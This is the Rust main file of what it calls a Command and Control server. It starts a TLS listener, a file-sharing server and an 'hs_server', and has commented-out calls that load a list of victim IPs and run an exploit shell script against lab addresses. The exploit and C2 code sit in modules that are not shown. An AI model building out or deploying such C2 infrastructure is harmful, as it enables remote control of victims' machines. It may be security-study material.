
mod set_tls;
mod connection;
mod save_ip;
mod set_dir;
mod exploit;
mod hs_server;

use std::thread;
//use std::net::IpAddr;

fn main() {

    set_dir::set_working_directory();

    let acceptor = set_tls::conf_tls();

    let my_ip = save_ip::save_ip();

    hs_server::princip(my_ip.clone());


    //let ip_victims: Vec<IpAddr> = save_ip::ip_targeting("conf/ip_victims").expect("Could not read victim Ip addrs");

   //exploit::execute_shell_script("10.0.2.15", "10.0.2.16"); 



    // Launch in a new thread the file sharing server

    let my_ip_fs = my_ip.clone();
    let acceptor_fs = acceptor.clone();
    thread::spawn(move || { // lauch file_share_server
        connection::file_share_server(acceptor_fs, my_ip_fs);
    });

    // launch the Command an Control server.
    connection::command_control_server(acceptor, my_ip);

}


// reference https://doc.rust-lang.org/book/ch20-01-single-threaded.html
